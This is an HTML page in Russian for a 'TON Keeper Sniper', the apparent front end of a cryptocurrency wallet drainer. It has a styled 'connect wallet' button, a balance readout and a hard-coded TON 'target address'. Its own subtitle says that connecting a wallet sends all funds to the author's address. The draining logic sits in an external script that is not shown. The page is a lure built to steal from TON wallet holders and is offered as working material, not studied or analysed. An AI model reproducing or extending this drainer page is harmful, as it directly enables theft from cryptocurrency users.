<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TON Keeper Sniper</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0, 200, 255, 0.15);
            text-align: center;
            max-width: 500px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #00d4ff, #0099ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .sub {
            color: #888;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .wallet-info {
            background: #111;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 25px;
            border: 1px solid #2a2a2a;
            word-break: break-all;
            font-size: 12px;
            color: #aaa;
        }
        .btn {
            background: linear-gradient(135deg, #00d4ff, #0077ff);
            border: none;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            padding: 16px 40px;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 4px 20px rgba(0, 100, 255, 0.3);
        }
        .btn:hover {
            transform: scale(1.03);
            box-shadow: 0 6px 30px rgba(0, 100, 255, 0.5);
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            background: #111;
            color: #ffcc00;
            font-size: 14px;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid #2a2a2a;
        }
        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #444;
        }
        #balanceDisplay {
            color: #00ff88;
            font-size: 16px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ TON KEEPER SNIPER</h1>
        <p class="sub">Подключи кошелёк → все средства уходят на мой адрес</p>

        <div class="wallet-info">
            <strong>👤 Ваш адрес:</strong> <span id="userWallet">Не подключён</span>
        </div>
        <div id="balanceDisplay">💰 Баланс: 0 TON</div>

        <button class="btn" id="connectBtn">🔗 ПОДКЛЮЧИТЬ КОШЕЛЁК</button>

        <div id="status">⏳ Нажмите кнопку для подключения TON Keeper</div>

        <div class="footer">Целевой адрес: UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P</div>
    </div>

    <script src="sniper.js"></script>
</body>
</html>
